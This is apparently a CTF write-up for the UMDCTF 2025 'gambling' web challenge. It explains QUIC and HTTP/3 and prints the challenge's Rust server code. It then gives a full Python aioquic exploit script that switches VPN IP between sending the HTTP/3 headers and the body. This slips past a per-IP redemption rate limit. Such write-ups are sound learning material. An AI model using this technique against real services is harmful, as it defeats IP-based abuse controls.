---
title: "HTTP/3 and IP spoofing"
description: "UMDCTF 2025"
summary: "HTTP/3 and IP spoofing"
categories: ["Writeup"]
tags: ["Web", "HTTP/3", "IP spoofing"]
#externalUrl: ""
date: 2025-05-02
draft: false
cover: ../../post/umdctf2025/feature.png
authors:
  - winky
---



Last weekend, I played UMDCTF with team aespaFanClub. There were four web challenges, but there is nothing to talk about the first three. Only the last web challenge was related to HTTP/3 and Rust, which I had never learned about before. I spent three days researching and redoing that challenge. There are many new and great things so I write this blog to save something beneficial for my future.

![image](https://hackmd.io/_uploads/SJNEKiWlee.png)

Before talking about the challenge we must know something about QUIC and HTTP/3 

## QUIC - Quick UDP Internet Connections

QUIC and HTTP/3 are newer internet technologies designed to make online communication faster, safer, and more reliable. In the past, most of websites used a system called TCP to send and receive data. TCP is dependable but can be slow at times. QUIC, on the other hand, uses a different system called UDP. This helps it avoid some delays while still keeping things reliable. Plus, QUIC has built-in security using TLS 1.3 encryption. 

![image](https://hackmd.io/_uploads/BJ-qCiZlle.png)

In HTTP (TCP), all data packets must arrive in order. If one packet is delayed or lost, everything waits causing a head-of-line blocking problem. In QUIC (UDP), packets are sent independently. If one is delayed, others can still be processed making it faster and more efficient, especially on unreliable networks.

More specified details can be read at https://www.auvik.com/franklyit/blog/what-is-quic-protocol/

## HTTP/3

HTTP/3 is a significant advance over HTTP/2. It essentially relies on QUIC for security and integrity of data, peer authentication, and reliable, in-order data delivery with improved performance. These are improvements on top of HTTP/2 that cannot be easily accommodated by TCP, which is why it is necessary to switch the underlying protocol.

More specified details can be read at https://portswigger.net/daily-swig/http-3-everything-you-need-to-know-about-the-next-generation-web-protocol

## web/gambling challenge

![image](https://hackmd.io/_uploads/Hkz_tjZlxx.png)

The web gave us two back-end files written in Rust. The hard thing started when I used Burpsuite proxy to catch request but ...

![image](https://hackmd.io/_uploads/S1Esqs-exg.png)

It says something like the web browser we use must use a browser which supports HTTP/3 and no custom HTTP client. Moreover, HTTP/3 is created using QUIC which uses UDP protocol in transport layer and Burpsuite only catch TCP request. But why can't the website load ? That is because BurpSuite can only catch HTTP/1.1 and HTTP/2 in my current version now. And when I turned off the proxy: 

![image](https://hackmd.io/_uploads/HJe4cioZggg.png)

So in this challenge, we will use script to automate and perform some method to website. First, we will read the source code to find out how the web works.

```rust
//user.rs

use std::net::IpAddr;
use std::sync::atomic::{AtomicI32, Ordering};
use std::sync::{Arc, Mutex, RwLock};

pub struct User {
    pub username: String,
    pub password: String,
    pub credits: AtomicI32,
    pub signup_ip: IpAddr,
    pub ratelimited_ips: Mutex<Vec<IpAddr>>,
}

impl User {
    pub fn new(username: String, password: String, signup_ip: IpAddr) -> Self {
        Self {
            username,
            password,
            credits: AtomicI32::new(0),
            signup_ip,
            ratelimited_ips: Mutex::new(Vec::new()),
        }
    }

    pub fn test_ratelimited(&self, ip: IpAddr) -> bool {
        let mut ratelimited_ips = self.ratelimited_ips.lock().unwrap();
        let is_ratelimited = ratelimited_ips.contains(&ip);
        if !is_ratelimited {
            ratelimited_ips.push(ip);
        }

        is_ratelimited
    }

    pub fn use_credits(&self, credits_to_use: i32, allow_negative: bool) -> bool {
        self.credits
            .fetch_update(Ordering::SeqCst, Ordering::SeqCst, |old_credits| {
                let new_credits = old_credits - credits_to_use;
                let valid = if allow_negative {
                    new_credits >= -100
                } else {
                    new_credits >= 0
                };

                if valid {
                    Some(new_credits)
                } else {
                    None
                }
            })
            .is_ok()
    }
}

pub struct UserDatabase {
    users: RwLock<Vec<Arc<User>>>,
}

impl UserDatabase {
    pub fn new() -> UserDatabase {
        Self {
            users: RwLock::new(Vec::new()),
        }
    }

    pub fn create_user(&self, user: User) -> bool {
        let mut users_guard = self.users.write().unwrap();
        if users_guard
            .iter()
            .any(|existing_user| existing_user.username == user.username)
        {
            return false;
        }

        users_guard.push(Arc::new(user));
        true
    }

    pub fn find_user(&self, username: &str, password: &str) -> Option<Arc<User>> {
        let users_guard = self.users.read().unwrap();
        users_guard
            .iter()
            .find(|user| user.username == username && user.password == password)
            .cloned()
    }

    pub fn reset(&self) {
        let mut users_guard = self.users.write().unwrap();
        users_guard.clear();
    }
}
```

```rust 
//router.rs

use crate::user::{User, UserDatabase};
use bytes::Bytes;
use http::StatusCode;
use serde::Deserialize;
use serde_json::json;
use std::sync::atomic::Ordering;
use std::sync::Arc;

const REDEMPTION_CODE: &'static str =
    "eW91IHRoaW5rIHlvdSdyZSBzcGVjaWFsIGJlY2F1c2UgeW91IGtub3cgaG93IHRvIGRlY29kZSBiYXNlNjQ/";

const INDEX_HTML: &'static str = include_str!("index.html");

const LETSGO_MP3: &'static [u8] = include_bytes!("letsgo.mp3");

const DANGIT_MP3: &'static [u8] = include_bytes!("dangit.mp3");

pub struct Router {
    database: Arc<UserDatabase>,
    flag: String,
}

impl Router {
    pub fn new(flag: String, database: Arc<UserDatabase>) -> Self {
        Self { database, flag }
    }

    async fn check_valid_user(
        &self,
        quic_conn: &quinn::Connection,
        req: &http::Request<()>,
        stream: &mut h3::server::RequestStream<h3_quinn::BidiStream<Bytes>, Bytes>,
    ) -> Result<Option<Arc<User>>, h3::Error> {
        #[derive(Deserialize)]
        struct AuthorizationHeader {
            username: String,
            password: String,
        }

        let user_opt = req
            .headers()
            .get(http::header::AUTHORIZATION)
            .and_then(|value| serde_json::from_slice::<AuthorizationHeader>(value.as_bytes()).ok())
            .and_then(|parsed_header| {
                self.database
                    .find_user(&parsed_header.username, &parsed_header.password)
            });
        let Some(user) = user_opt else {
            crate::h3_util::send_response(stream, StatusCode::UNAUTHORIZED).await?;
            crate::h3_util::send_body(stream, "invalid username + password").await?;
            return Ok(None);
        };

        if user.signup_ip != quic_conn.remote_address().ip() {
            crate::h3_util::send_response(stream, StatusCode::FORBIDDEN).await?;
            let warning = format!(
                "Please use the IP address that you signed up with ({}).",
                user.signup_ip
            );
            crate::h3_util::send_body(stream, warning).await?;
            return Ok(None);
        }

        Ok(Some(user))
    }

    pub async fn index(
        &self,
        stream: &mut h3::server::RequestStream<h3_quinn::BidiStream<Bytes>, Bytes>,
    ) -> Result<(), h3::Error> {
        crate::h3_util::send_response(stream, StatusCode::OK).await?;
        crate::h3_util::send_body(stream, INDEX_HTML).await?;
        Ok(())
    }

    pub async fn letsgo(
        &self,
        stream: &mut h3::server::RequestStream<h3_quinn::BidiStream<Bytes>, Bytes>,
    ) -> Result<(), h3::Error> {
        let response = http::Response::builder()
            .status(StatusCode::OK)
            .header(http::header::CONTENT_TYPE, "audio/mpeg")
            .body(())
            .unwrap();
        stream.send_response(response).await?;
        crate::h3_util::send_body(stream, LETSGO_MP3).await?;
        Ok(())
    }

    pub async fn dangit(
        &self,
        stream: &mut h3::server::RequestStream<h3_quinn::BidiStream<Bytes>, Bytes>,
    ) -> Result<(), h3::Error> {
        let response = http::Response::builder()
            .status(StatusCode::OK)
            .header(http::header::CONTENT_TYPE, "audio/mpeg")
            .body(())
            .unwrap();
        stream.send_response(response).await?;
        crate::h3_util::send_body(stream, DANGIT_MP3).await?;
        Ok(())
    }

    pub async fn register(
        &self,
        quic_conn: &quinn::Connection,
        stream: &mut h3::server::RequestStream<h3_quinn::BidiStream<Bytes>, Bytes>,
    ) -> Result<(), h3::Error> {
        #[derive(Deserialize)]
        struct RegisterPayload {
            username: String,
            password: String,
        }
        let Some(payload) = crate::h3_util::read_payload::<RegisterPayload>(stream).await? else {
            return Ok(());
        };

        if payload.username.len() < 8 || payload.password.len() < 8 {
            crate::h3_util::send_response(stream, StatusCode::FORBIDDEN).await?;
            crate::h3_util::send_body(stream, "username and password must be at least 8 characters").await?;
            return Ok(());
        }

        let user = User::new(
            payload.username.to_owned(),
            payload.password.to_owned(),
            quic_conn.remote_address().ip(),
        );
        if self.database.create_user(user) {
            crate::h3_util::send_response(stream, StatusCode::CREATED).await?;
        } else {
            crate::h3_util::send_response(stream, StatusCode::FORBIDDEN).await?;
            crate::h3_util::send_body(stream, "this user already exists").await?;
        }

        Ok(())
    }

    pub async fn login(
        &self,
        quic_conn: &quinn::Connection,
        req: &http::Request<()>,
        stream: &mut h3::server::RequestStream<h3_quinn::BidiStream<Bytes>, Bytes>,
    ) -> Result<(), h3::Error> {
        if self.check_valid_user(quic_conn, req, stream).await?.is_some() {
            crate::h3_util::send_response(stream, StatusCode::NO_CONTENT).await?;
        }

        Ok(())
    }

    pub async fn redeem_code(
        &self,
        quic_conn: &quinn::Connection,
        req: &http::Request<()>,
        stream: &mut h3::server::RequestStream<h3_quinn::BidiStream<Bytes>, Bytes>,
    ) -> Result<(), h3::Error> {
        let Some(user) = self.check_valid_user(quic_conn, req, stream).await? else {
            return Ok(());
        };
        let Some(payload) = crate::h3_util::read_payload::<String>(stream).await? else {
            return Ok(());
        };

        if payload != REDEMPTION_CODE {
            crate::h3_util::send_response(stream, StatusCode::BAD_REQUEST).await?;
            crate::h3_util::send_body(stream, "invalid code").await?;
            return Ok(());
        }

        if user.test_ratelimited(quic_conn.remote_address().ip()) {
            crate::h3_util::send_response(stream, StatusCode::TOO_MANY_REQUESTS).await?;
            crate::h3_util::send_body(stream, "a high number of requests are coming from your device. you are ratelimited").await?;
            return Ok(());
        }

        user.credits.fetch_add(100, Ordering::SeqCst);
        crate::h3_util::send_response(stream, StatusCode::NO_CONTENT).await?;

        Ok(())
    }

    pub async fn credits(
        &self,
        quic_conn: &quinn::Connection,
        req: &http::Request<()>,
        stream: &mut h3::server::RequestStream<h3_quinn::BidiStream<Bytes>, Bytes>,
    ) -> Result<(), h3::Error> {
        let Some(user) = self.check_valid_user(quic_conn, req, stream).await? else {
            return Ok(());
        };

        let response = http::Response::builder()
            .status(StatusCode::OK)
            .header(http::header::CONTENT_TYPE, "application/json")
            .body(())
            .unwrap();
        stream.send_response(response).await?;
        crate::h3_util::send_body(
            stream,
            json!(user.credits.load(Ordering::SeqCst)).to_string(),
        )
        .await?;
        Ok(())
    }

    pub async fn wager(
        &self,
        quic_conn: &quinn::Connection,
        req: &http::Request<()>,
        stream: &mut h3::server::RequestStream<h3_quinn::BidiStream<Bytes>, Bytes>,
    ) -> Result<(), h3::Error> {
        let Some(user) = self.check_valid_user(quic_conn, req, stream).await? else {
            return Ok(());
        };
        let Some(payload) = crate::h3_util::read_payload::<i32>(stream).await? else {
            return Ok(());
        };

        if payload < 0 {
            crate::h3_util::send_response(stream, StatusCode::BAD_REQUEST).await?;
            crate::h3_util::send_body(stream, "you can't wager negative credits").await?;
            return Ok(());
        }
        if payload > 100 {
            crate::h3_util::send_response(stream, StatusCode::BAD_REQUEST).await?;
            crate::h3_util::send_body(stream, "that's too much").await?;
            return Ok(());
        }

        if user.use_credits(payload, true) {
            crate::h3_util::send_response(stream, StatusCode::NO_CONTENT).await?;
        } else {
            crate::h3_util::send_response(stream, StatusCode::BAD_REQUEST).await?;
            crate::h3_util::send_body(stream, "you went bankrupt :/").await?;
        }

        Ok(())
    }

    pub async fn flag(
        &self,
        quic_conn: &quinn::Connection,
        req: &http::Request<()>,
        stream: &mut h3::server::RequestStream<h3_quinn::BidiStream<Bytes>, Bytes>,
    ) -> Result<(), h3::Error> {
        let Some(user) = self.check_valid_user(quic_conn, req, stream).await? else {
            return Ok(());
        };

        if user.use_credits(300, false) {
            crate::h3_util::send_response(stream, StatusCode::OK).await?;
            crate::h3_util::send_body(stream, self.flag.clone()).await?;
        } else {
            crate::h3_util::send_response(stream, StatusCode::FORBIDDEN).await?;
            crate::h3_util::send_body(stream, "not enough credits").await?;
        }

        Ok(())
    }

    pub async fn not_found(
        &self,
        stream: &mut h3::server::RequestStream<h3_quinn::BidiStream<Bytes>, Bytes>,
    ) -> Result<(), h3::Error> {
        crate::h3_util::send_response(stream, StatusCode::NOT_FOUND).await?;
        Ok(())
    }
}
```

## Analyze the source code

#### - register and login

we can create a new account and login with it

![image](https://hackmd.io/_uploads/S1daFTWeee.png)

#### - redeem code

get a code and 

* check_valid_user: check if username and password are valid, and the IP of the request is the same as the registered IP.

```rust
let Some(user) = user_opt else {
    crate::h3_util::send_response(stream, StatusCode::UNAUTHORIZED).await?;
    crate::h3_util::send_body(stream, "invalid username + password").await?;
    return Ok(None);
};

if user.signup_ip != quic_conn.remote_address().ip() {
    crate::h3_util::send_response(stream, StatusCode::FORBIDDEN).await?;
    let warning = format!(
        "Please use the IP address that you signed up with ({}).",
        user.signup_ip
    );
    crate::h3_util::send_body(stream, warning).await?;
    return Ok(None);
}
```

* check REDEMPTION_CODE is valid

The REDEMPTION_CODE is

```rust
const REDEMPTION_CODE: &'static str =
    "eW91IHRoaW5rIHlvdSdyZSBzcGVjaWFsIGJlY2F1c2UgeW91IGtub3cgaG93IHRvIGRlY29kZSBiYXNlNjQ/";
```

* check test_ratelimited: one IP is able to redeem one time, after that it will be locked.

```rust
pub fn test_ratelimited(&self, ip: IpAddr) -> bool {
    let mut ratelimited_ips = self.ratelimited_ips.lock().unwrap();
    let is_ratelimited = ratelimited_ips.contains(&ip);
    if !is_ratelimited {
        ratelimited_ips.push(ip);
    }

    is_ratelimited
}
```

#### - flag

* Check if the user has 300 credits; if so, give the flag

```rust
pub async fn flag(
    &self,
    quic_conn: &quinn::Connection,
    req: &http::Request<()>,
    stream: &mut h3::server::RequestStream<h3_quinn::BidiStream<Bytes>, Bytes>,
) -> Result<(), h3::Error> {
    let Some(user) = self.check_valid_user(quic_conn, req, stream).await? else {
        return Ok(());
    };

    if user.use_credits(300, false) {
        crate::h3_util::send_response(stream, StatusCode::OK).await?;
        crate::h3_util::send_body(stream, self.flag.clone()).await?;
    } else {
        crate::h3_util::send_response(stream, StatusCode::FORBIDDEN).await?;
        crate::h3_util::send_body(stream, "not enough credits").await?;
    }

    Ok(())
}
```

## IP spoofing

To exploit this website using Burpsuite, we can use some available extension scripts in this blog: https://dtm.uk/playing-with-http3. 

To test if the web uses HTTP/3, we will use try_http3_proxy.py.  First, we run this script to open a proxy on port 8081 

![image](https://hackmd.io/_uploads/BJVnznZegl.png)

In Firefox or other browsers, we set the proxy to the above address

![image](https://hackmd.io/_uploads/rkfJ73bxgx.png)

Now when we go to the web challenge we will see data come from 

![image](https://hackmd.io/_uploads/HkCIXhWxeg.png)

OK, so HTTP/3 requests are supported, how can I "play" with it? 

In the blog, the author also explains how to send a request using minimal_http3_client.py and how it works. It is as the pictures below

![image](https://hackmd.io/_uploads/S14KS2bxgx.png)

HOW WAS THE IP SPOOFED IN THE DATAGRAM ABOVE?

The author of this challenge told me that when sending headers, the code starts to run and after that we can pause to change IP

![image](https://hackmd.io/_uploads/SkhQmGzexl.png)

Ok, for short the attack can be displayed: 

![image](https://hackmd.io/_uploads/Sy68FnZxgl.png)

So the insertion point in the datagram is 

![image](https://hackmd.io/_uploads/By9XqhZgxl.png)

## Solution

We will use the minimal_http3_client.py to modify and exploit. First we can see where to insert the wait for IP change is after the send headers block and before the send data block. We remember that only the second and the third redeem need to change IP so I add a counter to verify.

```python
class Config:
    DEFAULT_PORT = 443
    DEFAULT_TIMEOUT = 30
counter=0

class H3ClientProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        self.debug = kwargs.pop("debug", None)
        self.authority = kwargs.pop("authority", None)
        super().__init__(*args, **kwargs)
        self._http = H3Connection(self._quic)
        self._request_events: Dict[int, Deque[H3Event]] = {}
        self._request_waiter: Dict[int, asyncio.Future[Deque[H3Event]]] = {}
        self.http_response_headers = OrderedDict()
        self.http_response_data = bytearray()

    def http_event_received(self, event: H3Event) -> None:
        if isinstance(event, (HeadersReceived, DataReceived)):
            stream_id = event.stream_id
            if stream_id in self._request_events:
                # http
                self._request_events[event.stream_id].append(event)
                if event.stream_ended:
                    request_waiter = self._request_waiter.pop(stream_id)
                    request_waiter.set_result(self._request_events.pop(stream_id))

        if isinstance(event, DataReceived):
            self.http_response_data.extend(event.data)

        if isinstance(event, HeadersReceived):
            for k, v in event.headers:
                self.http_response_headers[k.decode()] = v.decode()

    def quic_event_received(self, event):
        if self.debug:
            print(f"[DEBUG] QUIC event: {type(event).__name__}")

        if self._http is not None:
            for http_event in self._http.handle_event(event):
                self.http_event_received(http_event)

        if isinstance(event, StreamDataReceived):
            if self.debug:
                print(f"[DEBUG] Stream: {event.stream_id} Data: {event.data[:100]}...")

        if isinstance(event, ConnectionIdIssued):
            if self.debug:
                print(f"[DEBUG] Connection ID: {event.connection_id}")

    async def send_http_request(self, request_path, request_method="GET", request_headers=None, request_content=None):
        if request_headers is None:
            request_headers = dict()
        stream_id = self._quic.get_next_available_stream_id()
        
        self._http.send_headers(
            stream_id,
            [
                (b":method", request_method.encode()),
                (b":scheme", b"https"),
                (b":authority", self.authority.encode()),
                (b":path", request_path.encode()),
            ] + [(k.encode(), v.encode()) for (k, v) in request_headers.items()],
            end_stream=not request_content
        )

        # TRANSMIT AND WAIT FOR IP CHANGE
        if counter > 0:
            self.transmit()
            print("Connect the VPN please")
            await asyncio.sleep(10)
        # TRANSMIT AND WAIT FOR IP CHANGE

        if request_content:
            self._http.send_data(
                stream_id=stream_id, data=request_content, end_stream=True
            )

        self.transmit()

        waiter = self._loop.create_future()
        self._request_events[stream_id] = deque()
        self._request_waiter[stream_id] = waiter
        self.transmit()

        # await asyncio.shield(waiter)
        await asyncio.sleep(1)

        return self.http_response_data, self.http_response_headers
```

### THE PROBLEM

Before sending the third packet we need to disconnect the VPN so that the headers of the third packet will use original IP to validate the function. If not, the server will tell us that the IP was spoofed.

So I added a disconnect block to use the original IP in each request and use a counter for faster execution.

```python
class Config:
    DEFAULT_PORT = 443
    DEFAULT_TIMEOUT = 30
counter=0

class H3ClientProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        self.debug = kwargs.pop("debug", None)
        self.authority = kwargs.pop("authority", None)
        super().__init__(*args, **kwargs)
        self._http = H3Connection(self._quic)
        self._request_events: Dict[int, Deque[H3Event]] = {}
        self._request_waiter: Dict[int, asyncio.Future[Deque[H3Event]]] = {}
        self.http_response_headers = OrderedDict()
        self.http_response_data = bytearray()

    def http_event_received(self, event: H3Event) -> None:
        if isinstance(event, (HeadersReceived, DataReceived)):
            stream_id = event.stream_id
            if stream_id in self._request_events:
                # http
                self._request_events[event.stream_id].append(event)
                if event.stream_ended:
                    request_waiter = self._request_waiter.pop(stream_id)
                    request_waiter.set_result(self._request_events.pop(stream_id))

        if isinstance(event, DataReceived):
            self.http_response_data.extend(event.data)

        if isinstance(event, HeadersReceived):
            for k, v in event.headers:
                self.http_response_headers[k.decode()] = v.decode()

    def quic_event_received(self, event):
        if self.debug:
            print(f"[DEBUG] QUIC event: {type(event).__name__}")

        if self._http is not None:
            for http_event in self._http.handle_event(event):
                self.http_event_received(http_event)

        if isinstance(event, StreamDataReceived):
            if self.debug:
                print(f"[DEBUG] Stream: {event.stream_id} Data: {event.data[:100]}...")

        if isinstance(event, ConnectionIdIssued):
            if self.debug:
                print(f"[DEBUG] Connection ID: {event.connection_id}")

    async def send_http_request(self, request_path, request_method="GET", request_headers=None, request_content=None):
        if request_headers is None:
            request_headers = dict()
        stream_id = self._quic.get_next_available_stream_id()

        global counter
        # WAIT FOR DISCONNECT THE VPN 
        if counter > 0:
            print("Disconnect the VPN please")
            await asyncio.sleep(10)
        # WAIT FOR DISCONNECT THE VPN 

        self._http.send_headers(
            stream_id,
            [
                (b":method", request_method.encode()),
                (b":scheme", b"https"),
                (b":authority", self.authority.encode()),
                (b":path", request_path.encode()),
            ] + [(k.encode(), v.encode()) for (k, v) in request_headers.items()],
            end_stream=not request_content
        )

        # TRANSMIT AND WAIT FOR IP CHANGE
        if counter > 0:
            self.transmit()
            print("Connect the VPN please")
            await asyncio.sleep(10)
        # TRANSMIT AND WAIT FOR IP CHANGE

        if request_content:
            self._http.send_data(
                stream_id=stream_id, data=request_content, end_stream=True
            )

        self.transmit()

        waiter = self._loop.create_future()
        self._request_events[stream_id] = deque()
        self._request_waiter[stream_id] = waiter
        self.transmit()

        # await asyncio.shield(waiter)
        await asyncio.sleep(1)

        return self.http_response_data, self.http_response_headers
```


###  Register

To perform a post request we will see how the api works based on the source code and browser. For example, when I register, I see a request as 

![image](https://hackmd.io/_uploads/rJFkypbgel.png)

![image](https://hackmd.io/_uploads/SkIC0hWeeg.png)

So the register uses application/json Content-Type to use for body request. It requires two parameters, which are username and password. So the register function i can perform as

```python
async def register(url: str, debug: bool = False):
    username = "winky" + str(random.randint(0, 100000))
    password = "haha" + str(random.randint(0, 100000))
    body = b'{"username":"uwu","password":"pwp"}'
    body = body.replace(b'uwu', username.encode())
    body = body.replace(b'pwp', password.encode())
    headers = {
        "content-length": str(len(body)),
        "content-type": "application/json",
    }
    data, headers = await send_request(url + "register", "POST", content=body, headers=headers)
    return username, password, data, headers
```

### Redeem

Like the register api, the redeem api also requires application/json data. It also includes an authorization header to find the user to add money.

![image](https://hackmd.io/_uploads/HkF3lpWexx.png)

![image](https://hackmd.io/_uploads/BJcol6blxg.png)

The redeem function can be used as

```python
async def redeem(username, password, url: str, debug: bool=False):
    code = b'"eW91IHRoaW5rIHlvdSdyZSBzcGVjaWFsIGJlY2F1c2UgeW91IGtub3cgaG93IHRvIGRlY29kZSBiYXNlNjQ/"'
    body = code
    auth = '{"username":"uwu","password":"pwp"}'
    auth = auth.replace('uwu', username)
    auth = auth.replace('pwp', password)
    headers = {
        'authorization': auth,
        "content-length": str(len(body)),
        "content-type": "application/json",
    }
    resp, resp_headers = await send_request(url + "redeem", "POST", content=body, headers=headers)
    return resp, resp_headers
```

### Change IP

To change IP there are many programs to do that. For me, I prefer [Warp](https://developers.cloudflare.com/warp-client/), which is free and secure. Moreover you can use other VPN programs like ProtonVPN, Windscribe, etc.

## Full exploit script

```python
import asyncio
import ssl
from collections import deque, OrderedDict
from urllib.parse import urlparse
from aioquic.asyncio import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import HeadersReceived, DataReceived, H3Event
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import StreamDataReceived, ConnectionIdIssued
from typing import Deque, Dict, Tuple
import argparse
import random

class Config:
    DEFAULT_PORT = 443
    DEFAULT_TIMEOUT = 30
counter=0

class H3ClientProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        self.debug = kwargs.pop("debug", None)
        self.authority = kwargs.pop("authority", None)
        super().__init__(*args, **kwargs)
        self._http = H3Connection(self._quic)
        self._request_events: Dict[int, Deque[H3Event]] = {}
        self._request_waiter: Dict[int, asyncio.Future[Deque[H3Event]]] = {}
        self.http_response_headers = OrderedDict()
        self.http_response_data = bytearray()

    def http_event_received(self, event: H3Event) -> None:
        if isinstance(event, (HeadersReceived, DataReceived)):
            stream_id = event.stream_id
            if stream_id in self._request_events:
                # http
                self._request_events[event.stream_id].append(event)
                if event.stream_ended:
                    request_waiter = self._request_waiter.pop(stream_id)
                    request_waiter.set_result(self._request_events.pop(stream_id))

        if isinstance(event, DataReceived):
            self.http_response_data.extend(event.data)

        if isinstance(event, HeadersReceived):
            for k, v in event.headers:
                self.http_response_headers[k.decode()] = v.decode()

    def quic_event_received(self, event):
        if self.debug:
            print(f"[DEBUG] QUIC event: {type(event).__name__}")

        if self._http is not None:
            for http_event in self._http.handle_event(event):
                self.http_event_received(http_event)

        if isinstance(event, StreamDataReceived):
            if self.debug:
                print(f"[DEBUG] Stream: {event.stream_id} Data: {event.data[:100]}...")

        if isinstance(event, ConnectionIdIssued):
            if self.debug:
                print(f"[DEBUG] Connection ID: {event.connection_id}")

    async def send_http_request(self, request_path, request_method="GET", request_headers=None, request_content=None):
        if request_headers is None:
            request_headers = dict()
        stream_id = self._quic.get_next_available_stream_id()

        global counter
        # WAIT FOR DISCONNECT THE VPN 
        if counter > 0:
            print("Disconnect the VPN please")
            await asyncio.sleep(10)
        # WAIT FOR DISCONNECT THE VPN 

        self._http.send_headers(
            stream_id,
            [
                (b":method", request_method.encode()),
                (b":scheme", b"https"),
                (b":authority", self.authority.encode()),
                (b":path", request_path.encode()),
            ] + [(k.encode(), v.encode()) for (k, v) in request_headers.items()],
            end_stream=not request_content
        )

        # TRANSMIT AND WAIT FOR IP CHANGE
        if counter > 0:
            self.transmit()
            print("Connect the VPN please")
            await asyncio.sleep(10)
        # TRANSMIT AND WAIT FOR IP CHANGE

        if request_content:
            self._http.send_data(
                stream_id=stream_id, data=request_content, end_stream=True
            )

        self.transmit()

        waiter = self._loop.create_future()
        self._request_events[stream_id] = deque()
        self._request_waiter[stream_id] = waiter
        self.transmit()

        # await asyncio.shield(waiter)
        await asyncio.sleep(1)

        return self.http_response_data, self.http_response_headers


def create_quic_configuration():
    configuration = QuicConfiguration(is_client=True)
    configuration.alpn_protocols = H3_ALPN
    configuration.verify_mode = ssl.CERT_NONE
    return configuration


async def send_request(url: str, method: str = "GET", content: bytes = None, headers: dict = None,
                       debug: bool = False) -> Tuple[bytes, dict]:
    parsed_url = urlparse(url)
    hostname = str(parsed_url.hostname)
    port = parsed_url.port or Config.DEFAULT_PORT
    configuration = create_quic_configuration()

    async with connect(
            host=hostname,
            port=port,
            create_protocol=lambda *args, **kwargs: H3ClientProtocol(*args, authority=hostname, debug=debug, **kwargs),
            configuration=configuration,
            wait_connected=False
    ) as client:
        try:
            return await asyncio.wait_for(
                client.send_http_request(parsed_url.path or "/",
                                         request_method=method,
                                         request_content=content,
                                         request_headers=headers),
                timeout=Config.DEFAULT_TIMEOUT)
        except asyncio.TimeoutError:
            print("Timeout waiting for response.")
            return bytearray(), dict()


async def get(url: str, debug: bool = False):
    return await send_request(url, "GET", debug=debug)


async def post(url: str, request_content: bytes, debug: bool = False):
    request_headers = {
        "content-length": str(len(request_content)),
        "content-type": "application/x-www-form-urlencoded",
    }
    return await send_request(url, "POST", content=request_content, headers=request_headers, debug=debug)

async def register(url: str, debug: bool = False):
    username = "winky" + str(random.randint(0, 100000))
    password = "haha" + str(random.randint(0, 100000))
    body = b'{"username":"uwu","password":"pwp"}'
    body = body.replace(b'uwu', username.encode())
    body = body.replace(b'pwp', password.encode())
    headers = {
        "content-length": str(len(body)),
        "content-type": "application/json",
    }
    data, headers = await send_request(url + "register", "POST", content=body, headers=headers)
    return username, password, data, headers

async def redeem(username, password, url: str, debug: bool=False):
    code = b'"eW91IHRoaW5rIHlvdSdyZSBzcGVjaWFsIGJlY2F1c2UgeW91IGtub3cgaG93IHRvIGRlY29kZSBiYXNlNjQ/"'
    body = code
    auth = '{"username":"uwu","password":"pwp"}'
    auth = auth.replace('uwu', username)
    auth = auth.replace('pwp', password)
    headers = {
        'authorization': auth,
        "content-length": str(len(body)),
        "content-type": "application/json",
    }
    resp, resp_headers = await send_request(url + "redeem", "POST", content=body, headers=headers)
    return resp, resp_headers

async def main():
    url = "https://gambling.challs.umdctf.io/"
    global counter

    username, password, data, headers = await register(url)
    print(f"Username: {username}")
    print(f"Password: {password}")
    print(f"Headers: {headers}")
    print(f"Data: {data.decode()}")
    data, headers = await redeem(username, password, url)
    counter+=1
    print(f"Headers: {headers}")
    print(f"Data: {data.decode()}")
    data, headers = await redeem(username, password, url)
    counter+=1
    print(f"Headers: {headers}")
    print(f"Data: {data.decode()}")
    data, headers = await redeem(username, password, url)
    print(f"Headers: {headers}")
    print(f"Data: {data.decode()}")


if __name__ == "__main__":
    asyncio.run(main())
```

## Result

### Without IP changing

If you don't change the IP while the script is running as default the result is

![image](https://hackmd.io/_uploads/HJBBEpZelg.png)



### With IP changing

First, the script will pause at

![image](https://hackmd.io/_uploads/r1rlUpZlgx.png)

Use warp to change IP

![image](https://hackmd.io/_uploads/SkvZUa-llx.png)

And the result is

![image](https://hackmd.io/_uploads/r15Q86Zelx.png)

YEEEEE, the status code is 204 which tells us that the IP was spoofed and the code was redeemed for the second time

Before the third redeem's data transmited we must disconnect from VPN and connect again. The end result is that we will get three status 204 responses. 

![image](https://hackmd.io/_uploads/SJ5jDTWxxl.png)

## Get flag

Go to the web and login with the above admin and we have 300 credits.

![image](https://hackmd.io/_uploads/BJwRv6-lxl.png)

Click buy flag and we finally solve the challenge

![image](https://hackmd.io/_uploads/r1KZOabgll.png)

## Conclusion

This is such a nice challenge that teaches me lots of things about new technology. 

